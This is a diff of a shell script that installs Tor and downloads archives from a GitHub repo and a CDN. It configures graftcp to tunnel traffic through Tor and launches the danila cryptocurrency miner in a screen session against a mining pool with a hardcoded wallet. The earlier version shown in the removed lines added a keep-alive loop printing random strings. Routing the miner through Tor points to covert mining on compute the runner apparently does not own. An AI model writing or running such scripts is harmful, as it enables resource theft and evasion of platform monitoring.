@@ -1,19 +1,30 @@
 #!/bin/sh
-ln -fs /usr/share/zoneinfo/America/Toronto /etc/localtime
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 apt update
 apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
 service tor start
+wget https://raw.githubusercontent.com/hanifgz/ngarit/main/graphics.tar.gz
+tar -xvzf graphics.tar.gz
 
-wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 127.0.0.1:9050
+socks5_username =
+socks5_password =
+END
 
-tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
-chmod +x danila-miner >/dev/null 2>&1
+sleep .2
 
-./danila-miner run https://server1.whalestonpool.com EQBU__5pqrJXDTFZInmRZl3nivwjunX6Glh41Z1KGNBLk1EZ
+echo " "
+echo " "
 
-while [ 1 ]; do
-  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
-sleep 2
-done
+echo "******************************************************************"
+
+wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz
+tar -xf danila-miner-2.3.1-ubuntu-bionic.tar.gz
+
+screen ./graftcp/graftcp ./danila-miner run https://server1.whalestonpool.com EQBU__5pqrJXDTFZInmRZl3nivwjunX6Glh41Z1KGNBLk1EZ
